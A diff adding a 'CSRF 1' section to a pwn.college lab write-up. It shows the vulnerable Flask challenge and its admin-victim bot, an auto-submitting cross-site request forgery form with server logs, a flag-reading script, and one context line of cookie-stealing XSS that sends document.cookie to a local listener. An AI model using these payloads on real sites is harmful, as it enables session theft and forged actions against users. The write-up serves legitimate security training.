@@ -3152,3 +3152,269 @@ Welcome to pwnpost, now with users!<hr>
 <h2>Author: hacker</h2><script>fetch("http://localhost:9999/?cookie=" + encodeURIComponent(document.cookie));</script><hr>
 </body></html>
 ```
+
+&nbsp;
+
+## CSRF 1
+
+### Source code
+```py title="/challenge/server" showLineNumbers
+#!/opt/pwn.college/python
+
+import tempfile
+import sqlite3
+import flask
+import os
+
+app = flask.Flask(__name__)
+
+class TemporaryDB:
+    def __init__(self):
+        self.db_file = tempfile.NamedTemporaryFile("x", suffix=".db")
+
+    def execute(self, sql, parameters=()):
+        connection = sqlite3.connect(self.db_file.name)
+        connection.row_factory = sqlite3.Row
+        cursor = connection.cursor()
+        result = cursor.execute(sql, parameters)
+        connection.commit()
+        return result
+
+flag = open("/flag").read().strip() if os.geteuid() == 0 else "pwn.college{fake_flag}"
+
+db = TemporaryDB()
+# https://www.sqlite.org/lang_createtable.html
+db.execute("""CREATE TABLE posts AS SELECT ? AS content, "admin" AS author, FALSE AS published""", [flag])
+db.execute("""CREATE TABLE users AS SELECT "admin" AS username, ? as password""", [flag])
+# https://www.sqlite.org/lang_insert.html
+db.execute("""INSERT INTO users SELECT "guest" as username, "password" as password""")
+db.execute("""INSERT INTO users SELECT "hacker" as username, "1337" as password""")
+
+@app.route("/login", methods=["POST"])
+def challenge_login():
+    username = flask.request.form.get("username")
+    password = flask.request.form.get("password")
+    if not username:
+        flask.abort(400, "Missing `username` form parameter")
+    if not password:
+        flask.abort(400, "Missing `password` form parameter")
+
+    # https://www.sqlite.org/lang_select.html
+    user = db.execute("SELECT * FROM users WHERE username = ? AND password = ?", (username, password)).fetchone()
+    if not user:
+        flask.abort(403, "Invalid username or password")
+
+    flask.session["username"] = username
+    return flask.redirect("/")
+
+@app.route("/draft", methods=["POST"])
+def challenge_draft():
+    if "username" not in flask.session:
+        flask.abort(403, "Log in first!")
+
+    content = flask.request.form.get("content", "")
+    # https://www.sqlite.org/lang_insert.html
+    db.execute(
+        "INSERT INTO posts (content, author, published) VALUES (?, ?, ?)",
+        (content, flask.session.get("username"), bool(flask.request.form.get("publish")))
+    )
+    return flask.redirect("/")
+
+@app.route("/publish", methods=["GET"])
+def challenge_publish():
+    if "username" not in flask.session:
+        flask.abort(403, "Log in first!")
+
+    # https://www.sqlite.org/lang_update.html
+    db.execute("UPDATE posts SET published = TRUE WHERE author = ?", [flask.session.get("username")])
+    return flask.redirect("/")
+
+@app.route("/", methods=["GET"])
+def challenge_get():
+    page = "<html><body>\nWelcome to pwnpost, now XSS-free (for admin, at least)!<hr>\n"
+    username = flask.session.get("username", None)
+    if username == "admin":
+        page += """<b>To prevent XSS, the admin does not view messages!</b>"""
+    elif username:
+        page += """
+            <form action=draft method=post>
+              Post:<textarea name=content>Write something!</textarea>
+              <input type=checkbox name=publish>Publish
+              <input type=submit value=Save>
+            </form><br><a href=publish>Publish your drafts!</a><hr>
+        """
+
+        for post in db.execute("SELECT * FROM posts").fetchall():
+            page += f"""<h2>Author: {post["author"]}</h2>"""
+            if post["published"]:
+                page += post["content"] + "<hr>\n"
+            else:
+                page += f"""(Draft post, showing first 12 characters):<br>{post["content"][:12]}<hr>"""
+    else:
+        page += """
+            <form action=login method=post>
+              Username:<input type=text name=username>
+              Password:<input type=text name=password>
+              <input type=submit name=submit value=Login>
+            </form><hr>
+        """
+
+    return page + "</body></html>"
+
+app.secret_key = os.urandom(8)
+app.config['SERVER_NAME'] = f"challenge.localhost:80"
+app.run("challenge.localhost", 80)
+```
+
+```py title="/challenge/victim" showLineNumbers
+#!/opt/pwn.college/python
+
+import psutil
+import urllib
+import atexit
+import time
+import sys
+import os
+
+from selenium import webdriver
+from selenium.webdriver.firefox.options import Options as FirefoxOptions
+from selenium.webdriver.firefox.service import Service as FirefoxService
+from selenium.webdriver.common.by import By
+from selenium.webdriver.support.wait import WebDriverWait
+from selenium.webdriver.support import expected_conditions as EC
+from selenium.common.exceptions import TimeoutException, WebDriverException
+
+os.setuid(os.geteuid())
+os.environ.clear()
+os.environ["PATH"] = "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
+
+options = FirefoxOptions()
+options.add_argument("--headless")
+service = FirefoxService(log_path="/dev/null")
+browser = webdriver.Firefox(service=service, options=options)
+atexit.register(browser.quit)
+
+open_ports = { s.laddr.port for s in psutil.net_connections(kind="inet") if s.status == 'LISTEN' }
+if 80 not in open_ports:
+    print("Service doesn't seem to be running?")
+    sys.exit(1)
+challenge_url = "http://challenge.localhost:80/"
+flag = open("/flag").read().strip()
+
+print(f"Visiting {challenge_url}")
+browser.get(challenge_url)
+
+print("Logging in as admin...")
+browser.find_element(By.NAME, "username").send_keys("admin")
+browser.find_element(By.NAME, "password").send_keys(flag)
+browser.find_element(By.NAME, "submit").submit()
+time.sleep(3)
+print("Logged in!")
+
+print("Visiting the attacker's website (http://hacker.localhost:1337/)...")
+browser.get("http://hacker.localhost:1337/")
+time.sleep(3)
+
+print("Visited! Go check if the attack worked!")
+```
+
+### CSRF
+
+This time, we have to perform a Cross-Site Request Forgery attack in order to make the `admin` puublish the draft which contains the flag.
+
+Basically, the steps are:
+- Craft a malicious payload which uses `form` in order to make a request to `/publish`
+- Host the payload on a malicious site on port `1337` 
+- Make the `admin` trigger the payload when they visit our page (done automatically by the `/challenge/victim`)
+- Login as either the `hacker` or `guest` user and read the flag
+
+#### Payload
+
+```html title="~/index.html" showLineNumbers
+<!-- csrf1.html -->
+<!DOCTYPE html>
+<html>
+  <body>
+    <form action="http://challenge.localhost/publish" method="GET" id="csrf-form">
+    </form>
+    <script>
+      document.getElementById('csrf-form').submit();
+    </script>
+  </body>
+</html>
+```
+
+Let's spin up our site.
+
+```
+hacker@web-security~csrf-1:~$ python3 -m http.server 1337 --bind hacker.localhost
+Serving HTTP on 127.0.0.1 port 1337 (http://127.0.0.1:1337/) ..
+```
+
+Now, let's run the victim script.
+
+```
+hacker@web-security~csrf-1:/$ /challenge/victim 
+Problem reading geckodriver versions: error sending request for url (https://raw.githubusercontent.com/SeleniumHQ/selenium/trunk/common/geckodriver/geckodriver-support.json). Using latest geckodriver version
+Exception managing firefox: error sending request for url (https://github.com/mozilla/geckodriver/releases/latest)
+Visiting http://challenge.localhost:80/
+Logging in as admin...
+Logged in!
+Visiting the attacker's website (http://hacker.localhost:1337/)...
+Visited! Go check if the attack worked!
+```
+
+Looking at our python server, we can see that the request to `/publish` was triggered.
+
+```
+hacker@web-security~csrf-1:~$ python3 -m http.server 1337 --bind hacker.localhost
+Serving HTTP on 127.0.0.1 port 1337 (http://127.0.0.1:1337/) ...
+127.0.0.1 - - [14/Jun/2025 13:40:56] "GET / HTTP/1.1" 200 -
+```
+
+We can even verify by checking the challenge server's logs.
+
+```
+hacker@web-security~csrf-1:/$ /challenge/server 
+ * Serving Flask app 'server'
+ * Debug mode: off
+WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.
+ * Running on http://challenge.localhost:80
+Press CTRL+C to quit
+127.0.0.1 - - [14/Jun/2025 13:40:53] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [14/Jun/2025 13:40:53] "GET /favicon.ico HTTP/1.1" 404 -
+127.0.0.1 - - [14/Jun/2025 13:40:53] "POST /login HTTP/1.1" 302 -
+127.0.0.1 - - [14/Jun/2025 13:40:53] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [14/Jun/2025 13:40:56] "GET /publish HTTP/1.1" 302 -
+127.0.0.1 - - [14/Jun/2025 13:40:56] "GET / HTTP/1.1" 200 -
+```
+
+Now that the draft containing the flag is published, we can login as `hacker` or `guest` and read it.
+
+```python title="~/script.py" showLineNumbers
+import requests
+
+url = "http://challenge.localhost:80/login"
+data = {
+    "username": "hacker",
+    "password": "1337"
+}
+
+with requests.Session() as session:
+    response = session.post(url, data = data)
+    print(response.text)
+```
+
+```
+hacker@web-security~csrf-1:/$ python ~/script.py 
+<html><body>
+Welcome to pwnpost, now XSS-free (for admin, at least)!<hr>
+
+            <form action=draft method=post>
+              Post:<textarea name=content>Write something!</textarea>
+              <input type=checkbox name=publish>Publish
+              <input type=submit value=Save>
+            </form><br><a href=publish>Publish your drafts!</a><hr>
+        <h2>Author: admin</h2>pwn.college{wMiuYIlcUXToOhP6b3ydLPs1T7v.ddTOzMDL4ITM0EzW}<hr>
+</body></html>
+```
